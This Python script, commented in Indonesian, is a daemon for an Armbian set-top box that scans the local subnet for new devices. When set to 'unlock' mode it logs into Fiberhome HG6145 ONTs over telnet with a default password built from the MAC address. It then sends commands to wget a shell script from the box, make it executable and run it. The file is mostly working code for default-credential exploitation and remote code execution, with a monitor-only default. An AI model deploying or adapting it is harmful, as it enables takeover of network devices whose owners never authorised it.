#!/usr/bin/env python3
"""
hg6145-auto-service.py — daemon auto-unlock Fiberhome HG6145F1/D2 di STB (Armbian).

Alur:
  1. Ping-sweep subnet (default dari interface default route; bisa dibatasi --range).
  2. Baca `ip neigh` → daftar IP/MAC yang live.
  3. MAC yang belum dikenal (tersimpan di seen.json) dianggap "perangkat baru".
  4. MODE=monitor (default): catat kandidat di log + seen.json, TIDAK menyentuh perangkat.
  5. MODE=unlock: coba telnet gpon/Fh@<6hex terakhir MAC>; jika login sukses,
     kirim wget dari HTTP server STB (mis. http://192.168.1.17:8080/custom-webui.sh),
     chmod +x, jalankan — lalu catat hasil.

Safety:
  * Default MODE=monitor — tidak ada aksi ke perangkat.
  * Gate tunggal = password default Fiberhome (gpon/Fh@MAC). Perangkat lain
    (MikroTik, router, dll.) tidak akan menerima password itu.
  * Opsi OUIS=<koma daftar OUI> membatasi kandidat ke OUI tertentu saja.
  * Saluran yang dipakai: ping (ICMP) + telnet (TCP/23) + HTTP (TCP/8080) — LAN only.
  * seen.json menyimpan MAC/IP saja — tanpa kredensial.

Konfigurasi: file teks KEY=VALUE (lihat auto-unlock.conf):
  MODE=monitor|unlock     Interval detik (default 60)
  RANGE=192.168.1.0/24    (opsional; default auto dari default-route interface)
  OUIS=                   (opsional, mis. "94:6B:,00:18:F8:")
  ONLINE_HOST=192.168.1.1 (opsional, hanya log)

Usage:
  python3 hg6145-auto-service.py [--conf /opt/hg6145-uplink/auto-unlock.conf] [--once]
"""

import argparse
import ipaddress
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

DEFAULT_CONF = '/opt/hg6145-uplink/auto-unlock.conf'
DEFAULT_SEEN = '/opt/hg6145-uplink/seen.json'
DEFAULT_LOG = '/opt/hg6145-uplink/auto-unlock.log'
HTTP_PORT = 8080

TELNET_IAC, TELNET_DONT, TELNET_DO, TELNET_WONT, TELNET_WILL, TELNET_SB, TELNET_SE = 255, 254, 253, 252, 251, 250, 240


def log(msg):
    line = '[%s] %s' % (time.strftime('%Y-%m-%d %H:%M:%S'), msg)
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a') as fh:
            fh.write(line + '\n')
    except OSError:
        pass


def load_conf(path):
    conf = {'MODE': 'monitor', 'INTERVAL': '60', 'RANGE': '', 'OUIS': ''}
    try:
        with open(path) as fh:
            for raw in fh:
                line = raw.strip()
                if not line or line.startswith('#') or '=' not in line:
                    continue
                k, v = line.split('=', 1)
                conf[k.strip().upper()] = v.strip()
    except FileNotFoundError:
        log('conf tidak ditemukan (%s) — pakai default MODE=monitor' % path)
    return conf


def load_seen():
    try:
        with open(SEEN_PATH) as fh:
            return json.load(fh)
    except Exception:
        return {}


def save_seen(seen):
    tmp = SEEN_PATH + '.tmp'
    with open(tmp, 'w') as fh:
        json.dump(seen, fh, indent=2)
    os.replace(tmp, SEEN_PATH)


def default_iface():
    try:
        out = subprocess.check_output(['ip', 'route', 'show', 'default'], text=True)
        m = re.search(r'dev (\S+)', out)
        return m.group(1) if m else 'eth0'
    except Exception:
        return 'eth0'


def default_range(iface):
    try:
        out = subprocess.check_output(['ip', '-4', 'addr', 'show', 'dev', iface], text=True)
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', out)
        if m:
            return str(ipaddress.ip_network('%s/%s' % (m.group(1), m.group(2)), strict=False))
    except Exception:
        pass
    return '192.168.1.0/24'


def ping_sweep(cidr):
    hosts = list(ipaddress.ip_network(cidr, strict=False).hosts())

    def ping(ip):
        subprocess.run(['ping', '-c1', '-W1', str(ip)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    with ThreadPoolExecutor(max_workers=32) as pool:
        list(pool.map(ping, hosts))


def neigh_devices(iface):
    devs = []
    try:
        out = subprocess.check_output(['ip', 'neigh', 'show', 'dev', iface], text=True)
    except Exception:
        return devs
    for line in out.splitlines():
        m = re.match(r'(\d+\.\d+\.\d+\.\d+).*lladdr\s+([0-9a-fA-F:]{17})', line)
        if m:
            devs.append((m.group(1), m.group(2).upper()))
    return devs


def mac_password(mac):
    hexpart = re.sub(r'[^0-9A-Fa-f]', '', mac)
    return 'Fh@' + hexpart[-6:].upper()


class Telnet:
    def __init__(self, host, port=23, timeout=8):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(1.0)
        self.buf = b''

    def _strip(self, data):
        out = bytearray()
        i = 0
        while i < len(data):
            b = data[i]
            if b == TELNET_IAC:
                nxt = data[i + 1] if i + 1 < len(data) else None
                if nxt == TELNET_IAC:
                    out.append(TELNET_IAC); i += 2; continue
                if nxt == TELNET_SB:
                    j = i + 2
                    while j + 1 < len(data) and not (data[j] == TELNET_IAC and data[j + 1] == TELNET_SE):
                        j += 1
                    i = j + 2; continue
                i += 3 if i + 2 < len(data) else 2
                continue
            out.append(b); i += 1
        return bytes(out)

    def read_until(self, marker, timeout=8):
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                time.sleep(0.1); continue
            if not chunk:
                break
            self.buf += self._strip(chunk)
            idx = self.buf.find(marker)
            if idx != -1:
                out, self.buf = self.buf[:idx], self.buf[idx + len(marker):]
                return out
        out, self.buf = self.buf, b''
        return out

    def read_all(self, timeout=6):
        out = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out += self._strip(chunk)
        return bytes(out)

    def send(self, text):
        self.sock.sendall(text.encode() + b'\r\n')

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def try_telnet_unlock(ip, mac, stb_ip):
    """Coba unlock; return (ok: bool, detail: str)."""
    password = mac_password(mac)
    url = 'http://%s:%d/custom-webui.sh' % (stb_ip, HTTP_PORT)
    commands = [
        'wget %s -O /var/custom-webui.sh' % url,
        'chmod +x /var/custom-webui.sh',
        '/var/custom-webui.sh',
    ]
    try:
        sock = socket.create_connection((ip, 23), timeout=2)
        sock.close()
    except OSError:
        return False, 'port 23 tidak terbuka'
    try:
        t = Telnet(ip)
        t.read_until(b'ogin:')
        t.send('gpon')
        t.read_until(b'assword:')
        t.send(password)
        banner = t.read_until(b'>')
        if b'>' not in banner:
            t.close()
            return False, 'login gagal (bukan ONT / password salah)'
        t.send('enable')
        t.read_until(b'assword:')
        t.send(password)
        out_enable = t.read_all(timeout=4)
        transcript = [out_enable]
        for cmd in commands:
            t.send(cmd)
            transcript.append(t.read_all(timeout=8))
        t.close()
        text = b'\n'.join(transcript).decode(errors='ignore')
        log('--- transcript %s ---\n%s\n---' % (ip, text))
        return True, 'unlock dikirim, cek log'
    except Exception as exc:
        return False, 'error: %s' % exc


def self_ip_for(target='192.168.1.1'):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return '192.168.1.17'


def main():
    global LOG_PATH, SEEN_PATH
    ap = argparse.ArgumentParser()
    ap.add_argument('--conf', default=DEFAULT_CONF)
    ap.add_argument('--once', action='store_true', help='jalankan 1 siklus lalu keluar')
    args = ap.parse_args()

    conf_dir = os.path.dirname(args.conf) or '.'
    SEEN_PATH = os.path.join(conf_dir, 'seen.json')
    LOG_PATH = os.path.join(conf_dir, 'auto-unlock.log')

    conf = load_conf(args.conf)
    mode = conf.get('MODE', 'monitor').lower()
    interval = int(conf.get('INTERVAL', '60'))
    oui_filter = [s.strip().upper() for s in conf.get('OUIS', '').split(',') if s.strip()]

    iface = default_iface()
    cidr = conf.get('RANGE') or default_range(iface)
    stb_ip = self_ip_for()
    log('start — mode=%s interval=%ss iface=%s range=%s stb_ip=%s' % (mode, interval, iface, cidr, stb_ip))

    while True:
        try:
            ping_sweep(cidr)
            devs = neigh_devices(iface)
            seen = load_seen()
            for ip, mac in devs:
                if mac in seen:
                    continue
                if oui_filter and not any(mac.startswith(o) for o in oui_filter):
                    seen[mac] = {'ip': ip, 'status': 'skipped-oui', 'first_seen': time.strftime('%Y-%m-%d %H:%M:%S')}
                    continue
                log('perangkat baru: %s (%s)' % (mac, ip))
                if mode == 'unlock':
                    ok, detail = try_telnet_unlock(ip, mac, stb_ip)
                    status = 'unlocked' if ok else 'failed'
                    log('  -> %s: %s' % (status, detail))
                else:
                    detail = 'mode=monitor (kandidat dicatat, tidak ada aksi)'
                    status = 'candidate'
                    log('  -> %s' % detail)
                seen[mac] = {'ip': ip, 'status': status, 'first_seen': time.strftime('%Y-%m-%d %H:%M:%S'), 'detail': detail}
            save_seen(seen)
        except Exception as exc:
            log('siklus error: %s' % exc)
        if args.once:
            break
        time.sleep(interval)


if __name__ == '__main__':
    main()
